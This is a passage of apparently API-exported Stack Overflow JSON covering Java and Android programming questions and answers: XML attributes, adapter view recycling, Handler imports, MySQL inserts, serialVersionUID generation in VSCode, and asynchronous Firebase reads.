noreferrer\">https://docs.oracle.com/cd/A97339_01/doc/xml/parser/org.w3c.dom.Attr.html#getValue()</a></p>\n"}],"owner":{"account_id":4904476,"reputation":4812,"user_id":3951576,"accept_rate":50,"display_name":"eastwater"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":743,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":70749922,"answer_count":1,"score":0,"last_activity_date":1642475857,"creation_date":1642471567,"question_id":70749538,"body_markdown":"Java XML: how to get attribute value as NULL if not present?\r\n\r\n    &lt;foo name=&quot;A&quot;/&gt;\r\n    \r\n    elementFoo.getAttribute(&quot;value&quot;);  // return empty string\r\n\r\nIt returns empty string. Is there a way to get the value as NULL? It is easy to convert it. But we have hundreds of places like this, and it would be great if XML parser support it. Is there a way to configure XML parser?\r\n","title":"Java XML: how to get attribute value as NULL if not present?","body":"<p>Java XML: how to get attribute value as NULL if not present?</p>\n<pre><code>&lt;foo name=&quot;A&quot;/&gt;\n\nelementFoo.getAttribute(&quot;value&quot;);  // return empty string\n</code></pre>\n<p>It returns empty string. Is there a way to get the value as NULL? It is easy to convert it. But we have hundreds of places like this, and it would be great if XML parser support it. Is there a way to configure XML parser?</p>\n"},{"tags":["java","android","android-layout"],"answers":[{"tags":[],"owner":{"account_id":5526708,"reputation":2404,"user_id":4387975,"display_name":"Niraj Niroula"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1506941658,"creation_date":1506941658,"answer_id":46524151,"question_id":46524029,"body_markdown":"Try this instead\r\n\r\n    view = View.inflate(R.layout.dialogue_item, viewGroup, null);","title":"Unconditional layout inflation from view adapter warning","body":"<p>Try this instead</p>\n\n<pre><code>view = View.inflate(R.layout.dialogue_item, viewGroup, null);\n</code></pre>\n"},{"tags":[],"owner":{"account_id":1528686,"reputation":12048,"user_id":1426469,"accept_rate":12,"display_name":"Leo Aso"},"down_vote_count":0,"up_vote_count":10,"is_accepted":true,"score":10,"last_activity_date":1506941784,"creation_date":1506941784,"answer_id":46524180,"question_id":46524029,"body_markdown":"View adapter is built so that instead of creating a new view for each item, views that scroll off screen can be reused (they are passed in via the 2nd argument of getView). You are being warned that you should try to reuse these views instead of _always_ inflating new ones. Change the line to\r\n\r\n    if (view == null) view = View.inflate(getActivity(),R.layout.dialogue_item, null);","title":"Unconditional layout inflation from view adapter warning","body":"<p>View adapter is built so that instead of creating a new view for each item, views that scroll off screen can be reused (they are passed in via the 2nd argument of getView). You are being warned that you should try to reuse these views instead of <em>always</em> inflating new ones. Change the line to</p>\n\n<pre><code>if (view == null) view = View.inflate(getActivity(),R.layout.dialogue_item, null);\n</code></pre>\n"},{"tags":[],"owner":{"account_id":5885102,"reputation":1044,"user_id":4633354,"accept_rate":50,"display_name":"metis"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1556883158,"creation_date":1556883158,"answer_id":55968993,"question_id":46524029,"body_markdown":"If not necessary, in other words if view is not null, then it is not necessary to call the following line in getView() method :\r\n\r\n\tview = inflter.inflate(R.layout.spinner_rect, null);\r\n\r\nthe problem arises the same wrong source code available on the web:\r\nhttps://abhiandroid.com/ui/custom-spinner-examples.html\r\nhttps://demonuts.com/android-custom-spinner-image/\r\napply my solution for correctness","title":"Unconditional layout inflation from view adapter warning","body":"<p>If not necessary, in other words if view is not null, then it is not necessary to call the following line in getView() method :</p>\n\n<pre><code>view = inflter.inflate(R.layout.spinner_rect, null);\n</code></pre>\n\n<p>the problem arises the same wrong source code available on the web:\n<a href=\"https://abhiandroid.com/ui/custom-spinner-examples.html\" rel=\"nofollow noreferrer\">https://abhiandroid.com/ui/custom-spinner-examples.html</a>\n<a href=\"https://demonuts.com/android-custom-spinner-image/\" rel=\"nofollow noreferrer\">https://demonuts.com/android-custom-spinner-image/</a>\napply my solution for correctness</p>\n"},{"tags":[],"owner":{"account_id":4065678,"reputation":117,"user_id":3340706,"display_name":"Taha"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642475821,"creation_date":1642465786,"answer_id":70749038,"question_id":46524029,"body_markdown":"Thanks for useful answers: I had the same error but I was using view binding. Resolved using [this](https://stackoverflow.com/a/51719884/3340706) approach.\r\n    \r\n","title":"Unconditional layout inflation from view adapter warning","body":"<p>Thanks for useful answers: I had the same error but I was using view binding. Resolved using <a href=\"https://stackoverflow.com/a/51719884/3340706\">this</a> approach.</p>\n"}],"owner":{"account_id":11441698,"reputation":1602,"user_id":8387050,"accept_rate":90,"display_name":"Priya"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":2783,"favorite_count":0,"down_vote_count":0,"up_vote_count":3,"accepted_answer_id":46524180,"answer_count":4,"score":3,"last_activity_date":1642475821,"creation_date":1506941101,"question_id":46524029,"body_markdown":"I am using GridView in my alert dialogue with below codes.its giving me error called in title. My codes and more required information is like below.\r\n\r\n      private void showGotoPageDialog() {\r\n            \r\n            final Dialog mDialog = new Dialog(getActivity());\r\n            mDialog.setContentView(R.layout.grid_dialogue);\r\n            mDialog.getWindow().setLayout(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);\r\n            GridView mGridView = (GridView) mDialog.findViewById(R.id.grid_dialog);\r\n            ArrayList&lt;String&gt; tmp = new ArrayList&lt;&gt;(mPageOptions.length);\r\n            for(int i = 0; i &lt; mPageOptions.length; i++)\r\n            {\r\n                tmp.add(mPageOptions[i].split(&quot; &quot;)[1]);\r\n            }\r\n            CustomAdapter adapter = new CustomAdapter(getActivity(), tmp, mPageIndx);\r\n            //ArrayAdapter&lt;String&gt; adapter = new ArrayAdapter&lt;String&gt;(getActivity(), android.R.layout.simple_list_item_1, tmp);\r\n            mGridView.setAdapter(adapter);\r\n            mGridView.setOnItemClickListener(new AdapterView.OnItemClickListener() {\r\n                @Override\r\n                public void onItemClick(AdapterView&lt;?&gt; adapterView, View view, int item, long l) {\r\n                    mDialog.dismiss();\r\n                    mPageIndx = item + 1;\r\n                    updateQuotesListServer();\r\n                    updatePageInfo();\r\n                }\r\n            });\r\n            mDialog.show();\r\n            TextView dismiss = (TextView) mDialog.findViewById(R.id.dialog_dismiss);\r\n            dismiss.setOnClickListener(new View.OnClickListener() {\r\n                @Override\r\n                public void onClick(View view) {\r\n                    mDialog.dismiss();\r\n                }\r\n            });\r\n        }\r\n\r\nand Adapter like this\r\n\r\n   \r\n\r\n     private class CustomAdapter extends BaseAdapter\r\n        {\r\n            private ArrayList&lt;String&gt; list;\r\n            private LayoutInflater inflater;\r\n            private int currentPage;\r\n    \r\n            CustomAdapter(Activity activity, ArrayList&lt;String&gt; list, int currentPage)\r\n            {\r\n                this.list = new ArrayList&lt;&gt;();\r\n                this.list.addAll(list);\r\n                inflater = (LayoutInflater) activity.getSystemService(AppCompatActivity.LAYOUT_INFLATER_SERVICE);\r\n                this.currentPage = currentPage;\r\n            }\r\n    \r\n            public void setCurrentPage(int currentPage)\r\n            {\r\n                this.currentPage = currentPage;\r\n            }\r\n    \r\n            @Override\r\n            public int getCount() {\r\n                return list.size();\r\n            }\r\n    \r\n            @Override\r\n            public Object getItem(int i) {\r\n                return null;\r\n            }\r\n    \r\n            @Override\r\n            public long getItemId(int i) {\r\n                return i;\r\n            }\r\n    \r\n            @Override\r\n            public View getView(int i, View view, ViewGroup viewGroup) {\r\n                view = View.inflate(getActivity(),R.layout.dialogue_item, null);\r\n                TextView txt = (TextView) view.findViewById(R.id.textview_dialogue);\r\n                txt.setText(list.get(i));\r\n                if(i == currentPage-1)\r\n                {\r\n                    txt.setTextColor(Color.BLACK);\r\n                }\r\n    \r\n                return view;\r\n            }\r\n        }\r\n\r\nits giving me warning on this line\r\n\r\n    view = View.inflate(getActivity(),R.layout.dialogue_item, null);\r\nwarning is like below\r\n\r\n    Unconditional layout inflation from view adapter: Should use View Holder pattern (use recycled view passed into this method as the second parameter) for smoother scrolling.\r\n\r\nMy code is working fine as expected and I am not facing any issue. `I want know that What changes require for fix this and what is benefit of it ?` Let me know if someone can help me for come out from this and solve my doubt. \r\n\r\nThanks","title":"Unconditional layout inflation from view adapter warning","body":"<p>I am using GridView in my alert dialogue with below codes.its giving me error called in title. My codes and more required information is like below.</p>\n\n<pre><code>  private void showGotoPageDialog() {\n\n        final Dialog mDialog = new Dialog(getActivity());\n        mDialog.setContentView(R.layout.grid_dialogue);\n        mDialog.getWindow().setLayout(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);\n        GridView mGridView = (GridView) mDialog.findViewById(R.id.grid_dialog);\n        ArrayList&lt;String&gt; tmp = new ArrayList&lt;&gt;(mPageOptions.length);\n        for(int i = 0; i &lt; mPageOptions.length; i++)\n        {\n            tmp.add(mPageOptions[i].split(\" \")[1]);\n        }\n        CustomAdapter adapter = new CustomAdapter(getActivity(), tmp, mPageIndx);\n        //ArrayAdapter&lt;String&gt; adapter = new ArrayAdapter&lt;String&gt;(getActivity(), android.R.layout.simple_list_item_1, tmp);\n        mGridView.setAdapter(adapter);\n        mGridView.setOnItemClickListener(new AdapterView.OnItemClickListener() {\n            @Override\n            public void onItemClick(AdapterView&lt;?&gt; adapterView, View view, int item, long l) {\n                mDialog.dismiss();\n                mPageIndx = item + 1;\n                updateQuotesListServer();\n                updatePageInfo();\n            }\n        });\n        mDialog.show();\n        TextView dismiss = (TextView) mDialog.findViewById(R.id.dialog_dismiss);\n        dismiss.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View view) {\n                mDialog.dismiss();\n            }\n        });\n    }\n</code></pre>\n\n<p>and Adapter like this</p>\n\n<pre><code> private class CustomAdapter extends BaseAdapter\n    {\n        private ArrayList&lt;String&gt; list;\n        private LayoutInflater inflater;\n        private int currentPage;\n\n        CustomAdapter(Activity activity, ArrayList&lt;String&gt; list, int currentPage)\n        {\n            this.list = new ArrayList&lt;&gt;();\n            this.list.addAll(list);\n            inflater = (LayoutInflater) activity.getSystemService(AppCompatActivity.LAYOUT_INFLATER_SERVICE);\n            this.currentPage = currentPage;\n        }\n\n        public void setCurrentPage(int currentPage)\n        {\n            this.currentPage = currentPage;\n        }\n\n        @Override\n        public int getCount() {\n            return list.size();\n        }\n\n        @Override\n        public Object getItem(int i) {\n            return null;\n        }\n\n        @Override\n        public long getItemId(int i) {\n            return i;\n        }\n\n        @Override\n        public View getView(int i, View view, ViewGroup viewGroup) {\n            view = View.inflate(getActivity(),R.layout.dialogue_item, null);\n            TextView txt = (TextView) view.findViewById(R.id.textview_dialogue);\n            txt.setText(list.get(i));\n            if(i == currentPage-1)\n            {\n                txt.setTextColor(Color.BLACK);\n            }\n\n            return view;\n        }\n    }\n</code></pre>\n\n<p>its giving me warning on this line</p>\n\n<pre><code>view = View.inflate(getActivity(),R.layout.dialogue_item, null);\n</code></pre>\n\n<p>warning is like below</p>\n\n<pre><code>Unconditional layout inflation from view adapter: Should use View Holder pattern (use recycled view passed into this method as the second parameter) for smoother scrolling.\n</code></pre>\n\n<p>My code is working fine as expected and I am not facing any issue. <code>I want know that What changes require for fix this and what is benefit of it ?</code> Let me know if someone can help me for come out from this and solve my doubt. </p>\n\n<p>Thanks</p>\n"},{"tags":["java","android"],"comments":[{"owner":{"account_id":11280150,"reputation":27,"user_id":8272907,"accept_rate":50,"display_name":"Low_key_tree"},"score":0,"creation_date":1499511012,"post_id":44985291,"comment_id":76945275,"body_markdown":"No thank you for telling me that","body":"No thank you for telling me that"}],"answers":[{"tags":[],"owner":{"account_id":6738050,"reputation":2401,"user_id":5192105,"display_name":"Sachin Bahukhandi"},"down_vote_count":0,"up_vote_count":6,"is_accepted":true,"score":6,"last_activity_date":1499511119,"creation_date":1499511119,"answer_id":44985366,"question_id":44985291,"body_markdown":"    \r\nCheck your activity imports and add this line to the class:\r\n\r\n    import android.os.*","title":"I tried using a handler, but it said &#39;cannot resolve symbol&quot;Handler&quot;&#39;","body":"<p>Check your activity imports and add this line to the class:</p>\n\n<pre><code>import android.os.*\n</code></pre>\n"},{"tags":[],"owner":{"account_id":7468890,"reputation":979,"user_id":5677472,"display_name":"djzhao"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642475526,"creation_date":1642475526,"answer_id":70749902,"question_id":44985291,"body_markdown":"In my case, i refer to a constant of class Handler in outer calss, see as below:\r\n```java\r\nimport static *.MyHandler.MSG_WHAT_PING_NETWORK;\r\npublic class OuterClass {\r\n    // use MSG_WHAT_PING_NETWORK...\r\n    // ...\r\n}\r\n\r\nclass MyHandler extends Handler {\r\n    public static final int MSG_WHAT_PING_NETWORK = 99;\r\n    // ...\r\n}\r\n\r\n```\r\nremove the import in outer class can solve the problem.","title":"I tried using a handler, but it said &#39;cannot resolve symbol&quot;Handler&quot;&#39;","body":"<p>In my case, i refer to a constant of class Handler in outer calss, see as below:</p>\n<pre class=\"lang-java prettyprint-override\"><code>import static *.MyHandler.MSG_WHAT_PING_NETWORK;\npublic class OuterClass {\n    // use MSG_WHAT_PING_NETWORK...\n    // ...\n}\n\nclass MyHandler extends Handler {\n    public static final int MSG_WHAT_PING_NETWORK = 99;\n    // ...\n}\n\n</code></pre>\n<p>remove the import in outer class can solve the problem.</p>\n"}],"owner":{"account_id":11280150,"reputation":27,"user_id":8272907,"accept_rate":50,"display_name":"Low_key_tree"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":3917,"favorite_count":0,"down_vote_count":1,"up_vote_count":1,"accepted_answer_id":44985366,"answer_count":2,"score":0,"last_activity_date":1642475526,"creation_date":1499510564,"question_id":44985291,"body_markdown":"What do i do to be able to use a handler to update my TextView every 2 secs because right now it comes up with &#39;cannot resolve symbol&quot;Handler&quot;&#39;\r\n\r\n    int noStart = 20;\r\n    int minus = 5;\r\n\r\n    public void number(View view) {\r\n        final TextView tx = (TextView) findViewById(R.id.number);\r\n\r\n        if(noStart&lt;0){\r\n            new Handler().postDelayed(new Runnable() {\r\n                public void run() {\r\n                    noStart -= minus;\r\n                    tx.setText(String.valueOf(noStart));\r\n                }\r\n            }, 2000);\r\n        }\r\n    }","title":"I tried using a handler, but it said &#39;cannot resolve symbol&quot;Handler&quot;&#39;","body":"<p>What do i do to be able to use a handler to update my TextView every 2 secs because right now it comes up with 'cannot resolve symbol\"Handler\"'</p>\n\n<pre><code>int noStart = 20;\nint minus = 5;\n\npublic void number(View view) {\n    final TextView tx = (TextView) findViewById(R.id.number);\n\n    if(noStart&lt;0){\n        new Handler().postDelayed(new Runnable() {\n            public void run() {\n                noStart -= minus;\n                tx.setText(String.valueOf(noStart));\n            }\n        }, 2000);\n    }\n}\n</code></pre>\n"},{"tags":["java","mysql","mysql-workbench","mysql-connector"],"comments":[{"owner":{"account_id":960307,"reputation":107861,"user_id":984823,"display_name":"Joop Eggen"},"score":0,"creation_date":1642475180,"post_id":70749799,"comment_id":125074492,"body_markdown":"Like (auto-)commit?","body":"Like (auto-)commit?"},{"owner":{"account_id":14357,"reputation":9128,"user_id":29470,"display_name":"Tim Moore"},"score":0,"creation_date":1642475612,"post_id":70749799,"comment_id":125074571,"body_markdown":"It looks like the result grid isn&#39;t showing the latest results, maybe because it&#39;s in editing mode. What happens when you click the refresh icon?","body":"It looks like the result grid isn&#39;t showing the latest results, maybe because it&#39;s in editing mode. What happens when you click the refresh icon?"},{"owner":{"account_id":19931986,"reputation":45,"user_id":14605453,"display_name":"Љубинко Стојановић - Смртник"},"score":0,"creation_date":1642496305,"post_id":70749799,"comment_id":125079416,"body_markdown":"Nothing, I tried to refresh the screen, various things, but it still stands the same","body":"Nothing, I tried to refresh the screen, various things, but it still stands the same"},{"owner":{"account_id":14357,"reputation":9128,"user_id":29470,"display_name":"Tim Moore"},"score":0,"creation_date":1642622145,"post_id":70749799,"comment_id":125123052,"body_markdown":"If you select all rows from the Java code, does it return all expected results?","body":"If you select all rows from the Java code, does it return all expected results?"}],"owner":{"account_id":19931986,"reputation":45,"user_id":14605453,"display_name":"Љубинко Стојановић - Смртник"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":116,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1642475106,"creation_date":1642474394,"question_id":70749799,"body_markdown":"I have a problem with the database, I have no idea what&#39;s going on. When I want to add data to the database, nothing happens, but when I add them via MySQL Workbench, usersid numbers (primary key) are occupied, but it does not show them in the table. \r\n \r\n     void createConnection() {\r\n        try {\r\n            Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);\r\n            this.con = DriverManager.getConnection(&quot;jdbc:mysql://localhost:3306/mydb&quot;,\r\n                    &quot;root&quot;, &quot;admin&quot;);\r\n            System.out.println(&quot;Database is connected.&quot;);\r\n        } catch (ClassNotFoundException ex) {\r\n            Logger.getLogger(BazaPodatakaVerzija1.class.getName()).log(Level.SEVERE, null, ex);\r\n        } catch (SQLException ex) {\r\n            Logger.getLogger(BazaPodatakaVerzija1.class.getName()).log(Level.SEVERE, null, ex);\r\n        }\r\n    }\r\n\r\n    try {\r\n            java.sql.Statement stmt = con.createStatement();\r\n\r\n            stmt.executeUpdate(&quot;INSERT INTO USERS(name, password, email) VALUES (&#39;3dsdadsadfa&#39;, &#39;34fd65652&#39;, &#39;fhjgjfgdh76&#39;)&quot;);\r\n\r\n            // stmt.executeUpdate(&quot;INSERT INTO USERS(name, password, email) VALUES (&#39;&quot; + ime_TF.getText() + &quot;&#39;, &#39;&quot; + lozinka_TF.getText() + &quot;&#39;, &#39;&quot; + email_TF.getText() +&quot;&#39;)&quot;);\r\n        } catch (SQLException ex) {\r\n            Logger.getLogger(InterfejsGIO.class.getName()).log(Level.SEVERE, null, ex);\r\n        }\r\n    \r\n\r\n[![enter image description here][1]][1]\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/MQMO1.png","title":"The database does not display the data in the table added via the JAVA program","body":"<p>I have a problem with the database, I have no idea what's going on. When I want to add data to the database, nothing happens, but when I add them via MySQL Workbench, usersid numbers (primary key) are occupied, but it does not show them in the table.</p>\n<pre><code> void createConnection() {\n    try {\n        Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);\n        this.con = DriverManager.getConnection(&quot;jdbc:mysql://localhost:3306/mydb&quot;,\n                &quot;root&quot;, &quot;admin&quot;);\n        System.out.println(&quot;Database is connected.&quot;);\n    } catch (ClassNotFoundException ex) {\n        Logger.getLogger(BazaPodatakaVerzija1.class.getName()).log(Level.SEVERE, null, ex);\n    } catch (SQLException ex) {\n        Logger.getLogger(BazaPodatakaVerzija1.class.getName()).log(Level.SEVERE, null, ex);\n    }\n}\n\ntry {\n        java.sql.Statement stmt = con.createStatement();\n\n        stmt.executeUpdate(&quot;INSERT INTO USERS(name, password, email) VALUES ('3dsdadsadfa', '34fd65652', 'fhjgjfgdh76')&quot;);\n\n        // stmt.executeUpdate(&quot;INSERT INTO USERS(name, password, email) VALUES ('&quot; + ime_TF.getText() + &quot;', '&quot; + lozinka_TF.getText() + &quot;', '&quot; + email_TF.getText() +&quot;')&quot;);\n    } catch (SQLException ex) {\n        Logger.getLogger(InterfejsGIO.class.getName()).log(Level.SEVERE, null, ex);\n    }\n</code></pre>\n<p><a href=\"https://i.stack.imgur.com/MQMO1.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/MQMO1.png\" alt=\"enter image description here\" /></a></p>\n"},{"tags":["java","serialization","visual-studio-code"],"comments":[{"owner":{"account_id":47283,"reputation":703817,"user_id":139985,"accept_rate":69,"display_name":"Stephen C"},"score":0,"creation_date":1642474487,"post_id":70741193,"comment_id":125074374,"body_markdown":"Please read:  [Please do not upload images of code/errors when asking a question.](//meta.stackoverflow.com/q/285551).  Your problem should be described in words rather than pictures.  1) Image links break.  2) Visually impaired programmers will have difficult with them.","body":"Please read:  <a href=\"//meta.stackoverflow.com/q/285551\">Please do not upload images of code/errors when asking a question.</a>.  Your problem should be described in words rather than pictures.  1) Image links break.  2) Visually impaired programmers will have difficult with them."}],"answers":[{"tags":[],"owner":{"account_id":19088616,"reputation":8284,"user_id":13939333,"display_name":"Molly Wang-MSFT"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642473978,"creation_date":1642473610,"answer_id":70749733,"question_id":70741193,"body_markdown":"Open Command Palette and choose **Java: Clean Java Language Server Workspace** then click the second option `generated serial version ID`\r\n\r\n[![enter image description here][1]][1]\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/BfJzs.gif","title":"Unable to generate long java serialversionuid in VSCode","body":"<p>Open Command Palette and choose <strong>Java: Clean Java Language Server Workspace</strong> then click the second option <code>generated serial version ID</code></p>\n<p><a href=\"https://i.stack.imgur.com/BfJzs.gif\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/BfJzs.gif\" alt=\"enter image description here\" /></a></p>\n"}],"owner":{"account_id":22574869,"reputation":163,"user_id":16760536,"display_name":"bibu3344"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":3960,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":1,"score":1,"last_activity_date":1642473978,"creation_date":1642421755,"question_id":70741193,"body_markdown":"The first problem I&#39;ve found was that VSCode by default doesn&#39;t suggest anything to implement the serialversionuid. So I followed the steps in [this tutorial](https://github.com/redhat-developer/vscode-java/issues/1140#issuecomment-889191080) to activate that suggestion.\r\n\r\n\r\nBut now, the problem I have is that it doesn&#39;t matter which option you choose. It always generates a short uid for you.\r\n[![enter image description here][1]][1]\r\n\r\nDoes anyone know how I can generate that uid? I&#39;ve tried to generate it by hand using `serialver` but I can&#39;t get it to work.\r\n\r\nThe question would be, how do I make VSCode generate the long uid correctly?\r\nAnd if it is not possible, how can I do it with `serialver` (or another solution)?\r\n\r\nthis is the relative path to my java file: `dahs-executor-v3\\src\\main\\java\\es\\blabla\\dahs\\dsl\\domain\\data\\v3\\Measurement1m.java`\r\n\r\nthis is the relative path of my .class: `dahs-executor-v3\\target\\classes\\es\\blabla\\dahs\\dsl\\domain\\data\\v3\\Measurement1m.class`\r\n\r\n(It&#39;s a Maven + Spring project)\r\n\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/IA4Uj.gif","title":"Unable to generate long java serialversionuid in VSCode","body":"<p>The first problem I've found was that VSCode by default doesn't suggest anything to implement the serialversionuid. So I followed the steps in <a href=\"https://github.com/redhat-developer/vscode-java/issues/1140#issuecomment-889191080\" rel=\"nofollow noreferrer\">this tutorial</a> to activate that suggestion.</p>\n<p>But now, the problem I have is that it doesn't matter which option you choose. It always generates a short uid for you.\n<a href=\"https://i.stack.imgur.com/IA4Uj.gif\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/IA4Uj.gif\" alt=\"enter image description here\" /></a></p>\n<p>Does anyone know how I can generate that uid? I've tried to generate it by hand using <code>serialver</code> but I can't get it to work.</p>\n<p>The question would be, how do I make VSCode generate the long uid correctly?\nAnd if it is not possible, how can I do it with <code>serialver</code> (or another solution)?</p>\n<p>this is the relative path to my java file: <code>dahs-executor-v3\\src\\main\\java\\es\\blabla\\dahs\\dsl\\domain\\data\\v3\\Measurement1m.java</code></p>\n<p>this is the relative path of my .class: <code>dahs-executor-v3\\target\\classes\\es\\blabla\\dahs\\dsl\\domain\\data\\v3\\Measurement1m.class</code></p>\n<p>(It's a Maven + Spring project)</p>\n"},{"tags":["java","android","firebase","firebase-realtime-database"],"comments":[{"owner":{"account_id":6819231,"reputation":132841,"user_id":5246885,"accept_rate":78,"display_name":"Alex Mamo"},"score":0,"creation_date":1642490125,"post_id":70749084,"comment_id":125077183,"body_markdown":"Firebase API is asynchronous. So please check the duplicates to see how can you solve this using a callback. You might also be interested in reading this article, [How to read data from Firebase Realtime Database using get()?](https://medium.com/firebase-tips-tricks/how-to-read-data-from-firebase-realtime-database-using-get-269ef3e179c5).","body":"Firebase API is asynchronous. So please check the duplicates to see how can you solve this using a callback. You might also be interested in reading this article, <a href=\"https://medium.com/firebase-tips-tricks/how-to-read-data-from-firebase-realtime-database-using-get-269ef3e179c5\" rel=\"nofollow noreferrer\">How to read data from Firebase Realtime Database using get()?</a>."}],"answers":[{"tags":[],"owner":{"account_id":15007945,"reputation":1469,"user_id":10833325,"display_name":"Dan Artillaga"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1642470712,"creation_date":1642470712,"answer_id":70749461,"question_id":70749084,"body_markdown":"Getting data from Firebase Realtime Database is an async task. So,\r\n```\r\nLog.d(&quot;mString&quot;, String.valueOf(strings.size()));\r\nreturn strings.get(0);\r\n```\r\nmight be getting called before the code inside ```addOnCompleteListener```.\r\n\r\nIf you want to have your ```getVCount``` to have a way to return the result, one way to do this is by creating your own callback like this:\r\n```\r\npublic interface Callback {\r\n    void onCallback(String result);\r\n}\r\n```\r\n```\r\nprivate void getVCount(String mPath, Callback callback) {\r\n        ArrayList&lt;String&gt; strings = new ArrayList&lt;&gt;();\r\n        FirebaseDatabase.getInstance().getReference(&quot;cars&quot;).child(mPath).child(&quot;maserati&quot;)\r\n                .get().addOnCompleteListener(new OnCompleteListener&lt;DataSnapshot&gt;() {\r\n            @Override\r\n            public void onComplete(@NonNull @NotNull Task&lt;DataSnapshot&gt; task) {\r\n                if(task.isSuccessful()){\r\n                    strings.add(task.getResult().getValue().toString());\r\n                }else{\r\n                    strings.add(&quot;0&quot;);\r\n                }\r\n                Log.d(&quot;mString&quot;, String.valueOf(strings.size()));\r\n                callback.onCallback(strings.get(0));\r\n            }\r\n        });\r\n    }\r\n```\r\nAnd call it like this:\r\n```\r\ngetVCount(new Callback() {\r\n    @Override\r\n    public void onCallback(String result) {\r\n        Log.d(TAG, result);\r\n    }\r\n});\r\n```","title":"Index:0 Size:0 when fetching item from firebase","body":"<p>Getting data from Firebase Realtime Database is an async task. So,</p>\n<pre><code>Log.d(&quot;mString&quot;, String.valueOf(strings.size()));\nreturn strings.get(0);\n</code></pre>\n<p>might be getting called before the code inside <code>addOnCompleteListener</code>.</p>\n<p>If you want to have your <code>getVCount</code> to have a way to return the result, one way to do this is by creating your own callback like this:</p>\n<pre><code>public interface Callback {\n    void onCallback(String result);\n}\n</code></pre>\n<pre><code>private void getVCount(String mPath, Callback callback) {\n        ArrayList&lt;String&gt; strings = new ArrayList&lt;&gt;();\n        FirebaseDatabase.getInstance().getReference(&quot;cars&quot;).child(mPath).child(&quot;maserati&quot;)\n                .get().addOnCompleteListener(new OnCompleteListener&lt;DataSnapshot&gt;() {\n            @Override\n            public void onComplete(@NonNull @NotNull Task&lt;DataSnapshot&gt; task) {\n                if(task.isSuccessful()){\n                    strings.add(task.getResult().getValue().toString());\n                }else{\n                    strings.add(&quot;0&quot;);\n                }\n                Log.d(&quot;mString&quot;, String.valueOf(strings.size()));\n                callback.onCallback(strings.get(0));\n            }\n        });\n    }\n</code></pre>\n<p>And call it like this:</p>\n<pre><code>getVCount(new Callback() {\n    @Override\n    public void onCallback(String result) {\n        Log.d(TAG, result);\n    }\n});\n</code></pre>\n"}],"owner":{"account_id":15965301,"reputation":1088,"user_id":11521157,"display_name":"CodingChap"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":123,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"closed_date":1642473526,"accepted_answer_id":70749461,"answer_count":1,"score":0,"last_activity_date":1642473535,"creation_date":1642466388,"question_id":70749084,"body_markdown":"I am trying to fetch a value from firebase like so: \r\n\r\n    private String getVCount(String mPath) {\r\n            ArrayList&lt;String&gt; strings = new ArrayList&lt;&gt;();\r\n            FirebaseDatabase.getInstance().getReference(&quot;cars&quot;).child(mPath).child(&quot;maserati&quot;)\r\n                    .get().addOnCompleteListener(new OnCompleteListener&lt;DataSnapshot&gt;() {\r\n                @Override\r\n                public void onComplete(@NonNull @NotNull Task&lt;DataSnapshot&gt; task) {\r\n                    if(task.isSuccessful()){\r\n                        strings.add(task.getResult().getValue().toString());\r\n                    }else{\r\n                        strings.add(&quot;0&quot;);\r\n                    }\r\n                }\r\n            });\r\n            Log.d(&quot;mString&quot;, String.valueOf(strings.size()));\r\n            return strings.get(0);\r\n        }\r\n\r\n\r\nI double checked the path, and even added an else condition just to make it so that the strings array list has at least one value in it.\r\n\r\nThe value in the database **does exist**, and **does not exist** in some cases--hence the else statement to add a default value of 0. I&#39;m not sure if this is the correct way to do that though.\r\n\r\nAdditionally, I&#39;m still getting the error: Index: 0 Size: 0--meaning that the strings array list is empty.\r\n\r\nAny idea why this may be so?\r\n\r\nThanks.","title":"Index:0 Size:0 when fetching item from firebase","body":"<p>I am trying to fetch a value from firebase like so:</p>\n<pre><code>private String getVCount(String mPath) {\n        ArrayList&lt;String&gt; strings = new ArrayList&lt;&gt;();\n        FirebaseDatabase.getInstance().getReference(&quot;cars&quot;).child(mPath).child(&quot;maserati&quot;)\n                .get().addOnCompleteListener(new OnCompleteListener&lt;DataSnapshot&gt;() {\n            @Override\n            public void onComplete(@NonNull @NotNull Task&lt;DataSnapshot&gt; task) {\n                if(task.isSuccessful()){\n                    strings.add(task.getResult().getValue().toString());\n                }else{\n                    strings.add(&quot;0&quot;);\n                }\n            }\n        });\n        Log.d(&quot;mString&quot;, String.valueOf(strings.size()));\n        return strings.get(0);\n    }\n</code></pre>\n<p>I double checked the path, and even added an else condition just to make it so that the strings array list has at least one value in it.</p>\n<p>The value in the database <strong>does exist</strong>, and <strong>does not exist</strong> in some cases--hence the else statement 